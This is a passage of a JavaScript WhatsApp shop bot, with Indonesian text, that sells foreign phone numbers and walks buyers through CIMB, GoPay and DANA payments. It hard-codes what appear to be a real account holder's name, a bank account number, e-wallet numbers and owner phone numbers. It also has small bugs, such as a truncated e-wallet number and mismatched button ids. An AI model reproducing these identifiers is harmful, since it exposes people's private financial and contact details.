                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );
// Mengirim pesan otomatis ke owner

        await sych.sendMessage('50251731838@s.whatsapp.net', {
            text: `*${n}${name} mengirimkan bukti transaksi mohon segera di cek${n}*\n\nTerimakasih`,
            mentions: [sender]
        }, { quoted: fkontak });
        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat mengirim upload_file:", error); // Debugging
    }
}
break;

case 'cancel_order': {
    console.log("Case 'cancel_order' dijalankan."); // Debugging

    // Pesan untuk memberitahukan bahwa order dibatalkan
    const cancelOrderText = `
❌ *Pesanan Anda Telah Dibatalkan:*
Kami mohon maaf atas ketidaknyamanan ini. Jika Anda ingin melakukan pemesanan kembali, silakan hubungi kami.

Jika ada pertanyaan, jangan ragu untuk menghubungi customer service kami.
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Status Pembatalan",
                sections: [
                    {
                        title: "Pilihan Lainnya",
                        rows: [
                            { title: "Pesan Ulang", id: "reorder", description: "Pesan ulang produk ini" },
                            { title: "Hubungi Owner", id: "contact_cs", description: "Hubungi customer service" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: cancelOrderText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Pesanan telah dibatalkan."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pembatalan Pesanan',
                                subtitle: 'Pesanan Anda telah dibatalkan.'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat mengirim cancel_order:", error); // Debugging
    }
}
break;


case 'contact_cs': {
    console.log("Case 'contact_cs' dijalankan."); // Debugging

    // Pesan untuk mengarahkan ke customer service
    const contactCSText = `
📞 *Hubungi Owner*:
Untuk bantuan lebih lanjut, Anda bisa langsung menghubungi Owner melalui panggilan telepon.

Jika Anda memerlukan bantuan lebih lanjut, bot kami siap membantu Anda!
    `;

    // Tombol interaktif untuk menghubungi customer service (CTA Call)
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Hubungi Owner",
                sections: [
                    {
                        title: "Kontak Owner",
                        rows: [
                            {
                                title: "Panggilan Owner",
                                id: "pepek",
                                description: "Hubungi Owner melalui Whatsapp / Telepon",
                                phone_number: "+6288274119688"
                            }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: contactCSText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Owner siap membantu Anda!"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Hubungi Owner',
                                subtitle: 'Untuk informasi lebih lanjut.'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat menghubungi CS:", error); // Debugging
    }
}
break;

case 'reorder': {
    console.log("Case 'reorder' dijalankan."); // Debugging

    // Daftar produk yang telah didefinisikan sebelumnya
    const products = [
        { title: "Nomor USA", id: "produk_usa", description: "Harga: Rp 20.000 - Tersedia" },
        { title: "Nomor UK", id: "produk_uk", description: "Harga: Rp 25.000 - Tersedia" },
        { title: "Nomor Kanada", id: "produk_canada", description: "Harga: Rp 22.000 - Tersedia" },
        { title: "Nomor Jerman", id: "produk_germany", description: "Harga: Rp 30.000 - Tersedia" },
        { title: "Nomor Jepang", id: "produk_japan", description: "Harga: Rp 35.000 - Tersedia" }
    ];


    // Pesan untuk pengulangan produk yang telah dibeli
    const reorderText = `
🔄 *Pesanan Anda Dapat Diulang!*
Anda dapat memilih produk yang ingin dipesan ulang dari daftar produk yang sebelumnya telah Anda pilih.
Silakan pilih produk untuk memulai proses reorder.
    `;

    // Tombol interaktif menggunakan produk yang sudah ada
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Pilih Produk untuk Dipesan Ulang",
                sections: [
                    {
                        title: "Produk Pilihan",
                        rows: products.map(product => ({
                            title: product.title,
                            id: product.id,
                            description: product.description
                        }))
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: reorderText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Pilih produk untuk dipesan ulang."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pesan Ulang Produk',
                                subtitle: 'Pilih produk dari daftar untuk memulai pemesanan ulang.'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses reorder:", error); // Debugging
    }
}
break;

//2
//BANK CIMB

case 'bank_cimb': {
    console.log("Case 'bank_cimb' dijalankan."); // Debugging

    // Proses konfirmasi pembayaran atau instruksi lainnya untuk Bank BRI
    const confirmationText = `
            *${n}BANK CIMB${n}*
            *${n}ATAS NAMA : GALANG${n}* 
            *${n}Nomor Rekening : 763802276000${n}*
            *${n}STATUS :${n}* 🟢
        
    `;

    // Tombol interaktif
  let button = [
        {
            name: "single_select",
        buttonParamsJson: JSON.stringify({
            title: "Proses Transaksi",
            sections: [
                {
                    title: "Confirm Transaksi",
                    rows: [
                        { title: "Confirm", id: "confirm_cimb_payment", description: "Konfirmasi Pembayaran CIMB" },
                        { title: "Upload", id: "upload_cimb_proof", description: "Kirim Bukti Transfer CIMB" }
                    ]
                }
            ]
        })
    },
    {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
            display_text: "Salin",
            copy_code: "763802276000"
        })
    }
];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: confirmationText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Konfirmasi Pembayaran Bank CIMB',
                                subtitle: 'Terima kasih atas pembayaran Anda!',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;

case 'confirm_cimb_payment': {

    const name = getUserName(m.sender);
    console.log("Case 'confirm_cimb_payment' dijalankan."); // Debugging

    // Pesan konfirmasi pembayaran
    const confirmationText = `
⚠️ *Pending Transaksi:*

📌 *BANK CIMB* 
- ATAS NAMA: GALANG
- Nomor Rekening: 763802276000

⚠️ Hai ${name} tunggu konfirmasi dari owner jika sudah "done" maka transaksi akan dilanjutkan.\n\n🔴 Jika ${name} belum melampirkan bukti screenshot harap kembali ke tombol *${n}Proses Transaksi${n}\n\n📬 Mengirim Pesan otomatis ke owner : *${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*`;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Tutup Transaksi",
                sections: [
                    {
                        title: "Close",
                        rows: [
                            { title: "Tutup", id: "close_payment", description: "Selesai" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: confirmationText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Klik tombol di bawah untuk aksi lanjutan."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Status Pending 🔴',
                                subtitle: 'Pembayaran Anda telah berhasil diterima!'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging

        // Mengirim pesan otomatis ke owner
        const sender = m.sender;
        await sych.sendMessage('50251731838@s.whatsapp.net', {
            text: `*${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*\n\n@${sender.split('@')[0]}`,
            mentions: [sender]
        }, { quoted: fkontak });

        console.log("Pesan otomatis ke owner berhasil dikirim."); // Debugging

    } catch (error) {
        console.error("Terjadi kesalahan saat memproses confirm_cimb_payment:", error); // Debugging
    }
}
break;


//UPLOAD
case 'upload_cimb_proof': {
    console.log("Case 'upload_cimb_proof' dijalankan."); // Debugging

    // Pesan instruksi pengunggahan
    const confirmationText = `
📝 *Instruksi Pengunggahan Bukti Transfer:*
1. Pastikan bukti transfer terlihat jelas.
2. Screnshoot yang diterima: JPG, PNG, atau PDF.
3. Kirim bukti transfer Anda dengan Screnshoot.

📌 *BANK CIMB:* 
- ATAS NAMA: GALANG
- Nomor Rekening: 763802276000
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Next",
                sections: [
                    {
                        title: "Lanjutkan Transaksi",
                        rows: [
                            { title: "Kirim Bukti", id: "submit_dana_proof", description: "Unggah Screnshot bukti transfer" }
                        ]
                    }
                ]
            })
        }
    ];


try {
    // Path ke file gambar lokal
    const imagePath = './src/media/cimbb.png'; // Ganti dengan path yang sesuai

    // Membaca gambar dari file lokal
    const imageBuffer = fs.readFileSync(imagePath);

    // Menyiapkan media (gambar)
    const mediaMessage = await prepareWAMessageMedia(
        { image: imageBuffer }, // Menggunakan buffer gambar lokal
        { upload: sych.waUploadToServer }
    );

    // Membuat pesan dengan gambar
    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: confirmationText
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "Klik tombol di bawah untuk melanjutkan transaksi."
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...mediaMessage, // Menambahkan gambar yang sudah disiapkan
                            title: 'Pengunggahan Bukti Transfer CIMB',
                            subtitle: 'Pastikan bukti transfer terlihat jelas.',
                            hasMediaAttachment: true, // Menandakan bahwa ada media
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: button
                        })
                    })
                }
            }
        },
        { quoted: fkontak }
    );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses upload_cimb_proof:", error); // Debugging
    }
}
break;

case 'submit_cimb_proof': {
    console.log("Case 'submit_cimb_proof' dijalankan."); // Debugging

    // Pesan konfirmasi pengunggahan bukti
    const proofSubmissionText = `

⚠️ *Catatan:* Pastikan Screnshoot terlihat jelas dan sesuai dengan instruksi yang diberikan.
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Kirim Bukti",
                sections: [
                    {
                        title: "Proses Unggah",
                        rows: [
                            { title: "Sudah Upload", id: "upload_file", description: "Klik jika Anda sudah mengupload bukti" },
                            { title: "Batalkan Pesanan", id: "cancel_order", description: "Klik untuk membatalkan pesanan" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: proofSubmissionText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Silakan unggah bukti Anda."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Unggah Bukti Transfer',
                                subtitle: 'Pengunggahan bukti transfer Anda.'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses submit_cimb_proof:", error); // Debugging
    }
}
break;


//akhir cimb


case 'confirm_payment': {
    const confirmText = `
        ✅ *Konfirmasi Pembayaran Berhasil*\n\n
        Terima kasih telah melakukan pembayaran. Silakan kirimkan bukti pembayaran berupa gambar atau foto tagihan melalui chat ini untuk diproses lebih lanjut.\n\n
        Kami akan segera memverifikasi pembayaran Anda. Mohon tunggu notifikasi selanjutnya.`;

    try {
        await sycreply(confirmText);
        console.log("Pesan konfirmasi pembayaran berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Gagal mengirim pesan konfirmasi pembayaran:", error); // Debugging jika terjadi error
    }
    break;
}



case 'ewallet': {
    console.log("Case 'ewallet' dijalankan."); // Debugging

    // Data bank
    const banks = [
        { title: "Gopay", id: "gopay", description: "Nomor E-wallet: 082280993065 - Status: 🟢" },
        { title: "Dana", id: "dana", description: "Nomor Dana: 082280993065 - Status: 🟢" }
    ];

    // Pesan instruksi
    let instructionText = "💳 *Informasi E-Wallet*\n\nPilih E-Wallet untuk melakukan transfer.";

    // Tombol interaktif
    let buttons = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Pilih E-Wallet untuk Transfer",
                sections: [
                    {
                        title: "E-Wallet Transfer",
                        rows: banks.map(bank => ({
                            title: bank.title,
                            id: bank.id, // Menggunakan ID bank langsung
                            description: bank.description
                        }))
                    }
                ]
            })
        }
    ];

    // Membuat pesan interaktif untuk memilih bank
    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: instructionText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Pilih E-Wallet untuk Pembayaran',
                                subtitle: 'Pilih E-Wallet Anda',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: buttons
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;




//awal gopay



case 'gopay': {
    console.log("Case 'gopay' dijalankan."); // Debugging

    // Proses konfirmasi pembayaran atau instruksi lainnya untuk Bank BRI
    const confirmationText = `
            *${n}E-Wallet Gopay${n}*
            *${n}ATAS NAMA : GALANG${n}* 
            *${n}Nomor E-Wallet : 082280993065${n}*
            *${n}STATUS :${n}* 🟢
        
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
        buttonParamsJson: JSON.stringify({
            title: "Proses Transaksi",
            sections: [
                {
                    title: "Confirm Transaksi",
                    rows: [
                        { title: "Confirm", id: "confirm_gopay_payment", description: "Konfirmasi Pembayaran Gopay" },
                        { title: "Upload", id: "upload_gopay_proof", description: "Kirim Bukti Transfer Gopay" }
                    ]
                }
            ]
        })
    },
    {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
            display_text: "Salin",
            copy_code: "082280993065"
        })
    }
];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: confirmationText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Konfirmasi Pembayaran E-wallet Gopay',
                                subtitle: 'Terima kasih atas pembayaran Anda!',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;


case 'confirm_gopay_payment': {
const name = getUserName(m.sender);
    console.log("Case 'confirm_gopay_payment' dijalankan."); // Debugging

    // Pesan konfirmasi pembayaran
    const confirmationText = `
⚠️ *Pending Transaksi:*

📌 *E-Wallet GOPAY* 
- ATAS NAMA: GALANG
- Nomor Gopay: 08228099306

⚠️ Hai ${name} tunggu konfirmasi dari owner jika sudah "done" maka transaksi akan dilanjutkan.\n\n🔴 Jika ${name} belum melampirkan bukti screenshot harap kembali ke tombol *${n}Proses Transaksi${n}\n\n📬 Mengirim Pesan otomatis ke owner : *${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*`;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Tutup Transaksi",
                sections: [
                    {
                        title: "Close",
                        rows: [
                            { title: "Tutup", id: "close_payment", description: "Selesai" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: confirmationText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Klik tombol di bawah untuk aksi lanjutan."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Status Pending 🔴',
                                subtitle: 'Pembayaran Anda telah berhasil diterima!'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging

        // Mengirim pesan otomatis ke owner
        const sender = m.sender;
        await sych.sendMessage('50251731838@s.whatsapp.net', {
            text: `*${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*\n\n@${sender.split('@')[0]}`,
            mentions: [sender]
        }, { quoted: fkontak });

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses confirm_gopay_payment:", error); // Debugging
    }
}
break;


//UPLOAD
case 'upload_gopay_proof': {
    console.log("Case 'upload_gopay_proof' dijalankan."); // Debugging

    // Pesan instruksi pengunggahan
    const confirmationText = `
📝 *Instruksi Pengunggahan Bukti Transfer:*
1. Pastikan bukti transfer terlihat jelas.
2. Screnshoot yang diterima: JPG, PNG, atau PDF.
3. Kirim bukti transfer Anda dengan Screnshoot.

📌 *E-Wallet GOPAY:* 
- ATAS NAMA: GALANG
- Nomor Gopay: 082280993065
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Next",
                sections: [
                    {
                        title: "Lanjutkan Transaksi",
                        rows: [
                            { title: "Kirim Bukti", id: "submit_dana_proof", description: "Unggah Screnshot bukti transfer" }
                        ]
                    }
                ]
            })
        }
    ];


try {
    // Path ke file gambar lokal
    const imagePath = './src/media/gopayy.png'; // Ganti dengan path yang sesuai

    // Membaca gambar dari file lokal
    const imageBuffer = fs.readFileSync(imagePath);

    // Menyiapkan media (gambar)
    const mediaMessage = await prepareWAMessageMedia(
        { image: imageBuffer }, // Menggunakan buffer gambar lokal
        { upload: sych.waUploadToServer }
    );

    // Membuat pesan dengan gambar
    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: confirmationText
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "Klik tombol di bawah untuk melanjutkan transaksi."
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            ...mediaMessage, // Menambahkan gambar yang sudah disiapkan
                            title: 'Pengunggahan Bukti Transfer Gopay',
                            subtitle: 'Pastikan bukti transfer terlihat jelas.',
                            hasMediaAttachment: true, // Menandakan bahwa ada media
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: button
                        })
                    })
                }
            }
        },
        { quoted: fkontak }
    );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses upload_gopay_proof:", error); // Debugging
    }
}
break;

case 'submit_gopay_proof': {
    console.log("Case 'submit_gopay_proof' dijalankan."); // Debugging

    // Pesan konfirmasi pengunggahan bukti
    const proofSubmissionText = `

⚠️ *Catatan:* Pastikan Screnshoot terlihat jelas dan sesuai dengan instruksi yang diberikan.
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Kirim Bukti",
                sections: [
                    {
                        title: "Proses Unggah",
                        rows: [
                            { title: "Sudah Upload", id: "upload_file", description: "Klik jika Anda sudah mengupload bukti" },
                            { title: "Batalkan Pesanan", id: "cancel_order", description: "Klik untuk membatalkan pesanan" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: proofSubmissionText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Silakan unggah bukti Anda."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Unggah Bukti Transfer',
                                subtitle: 'Pengunggahan bukti transfer Anda.'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses submit_gopay_proof:", error); // Debugging
    }
}
break;


//akhir gopay

//awal dana
case 'dana': {
    console.log("Case 'dana' dijalankan."); // Debugging

    // Proses konfirmasi pembayaran atau instruksi lainnya untuk Bank BRI
    const confirmationText = `
            *${n}E-Wallet DANA${n}*
            *${n}ATAS NAMA : GALANG${n}* 
            *${n}Nomor E-Wallet : 082280993065${n}*
            *${n}STATUS :${n}* 🟢
        
    `;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
        buttonParamsJson: JSON.stringify({
            title: "Proses Transaksi",
            sections: [
                {
                    title: "Confirm Transaksi",
                    rows: [
                        { title: "Confirm", id: "confirm_dana_payment", description: "Konfirmasi Pembayaran DANA" },
                        { title: "Upload", id: "upload_dana_proof", description: "Kirim Bukti Transfer dana" }
                    ]
                }
            ]
        })
    },
    {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
            display_text: "Salin",
            copy_code: "082280993065"
        })
    }
];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: confirmationText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Setelah transfer, silakan kirimkan bukti pembayaran untuk konfirmasi."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Konfirmasi Pembayaran E-wallet DANA',
                                subtitle: 'Terima kasih atas pembayaran Anda!',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan:", error); // Debugging jika error terjadi
    }
}
break;


case 'confirm_dana_payment': {
const name = getUserName(m.sender);
    console.log("Case 'confirm_dana_payment' dijalankan."); // Debugging
const userName = m.pushName || "Pengguna"; 
    // Pesan konfirmasi pembayaran
    const confirmationText = `
⚠️ *Pending Transaksi:*

📌 *E-Wallet DANA* 
- ATAS NAMA: GALANG
- Nomor dana: 08228099306

⚠️ Hai ${name} tunggu konfirmasi dari owner jika sudah "done" maka transaksi akan dilanjutkan.\n\n🔴 Jika ${name} belum melampirkan bukti screenshot harap kembali ke tombol *${n}Proses Transaksi${n}\n\n📬 Mengirim Pesan otomatis ke owner : *${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*)`;

    // Tombol interaktif
    let button = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "Tutup Transaksi",
                sections: [
                    {
                        title: "Close",
                        rows: [
                            { title: "Tutup", id: "close_payment", description: "Selesai" }
                        ]
                    }
                ]
            })
        }
    ];

    try {
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: confirmationText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "Klik tombol di bawah untuk aksi lanjutan."
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: 'Status Pending 🔴',
                                subtitle: 'Pembayaran Anda telah berhasil diterima!'
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: button
                            })
                        })
                    }
                }
            },
            { quoted: fkontak }
        );

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging

        // Mengirim pesan otomatis ke owner
        const sender = m.sender;
        await sych.sendMessage('50251731838@s.whatsapp.net', {
            text: `*${n}Konfirmasi Pembayaran dari ${name} mohon segera di cek, agar bisa melanjutkan proses selanjutnya, Terimakasih${n}*\n\n@${sender.split('@')[0]}`,
            mentions: [sender]
        }, { quoted: fkontak });

        console.log("Pesan berhasil dibuat:", msg); // Debugging
        await sych.relayMessage(m.key.remoteJid, msg.message, { messageId: msg.key.id });
        console.log("Pesan berhasil dikirim."); // Debugging
    } catch (error) {
        console.error("Terjadi kesalahan saat memproses confirm_dana_payment:", error); // Debugging
    }
}
break;


//UPLOAD
case 'upload_dana_proof': {
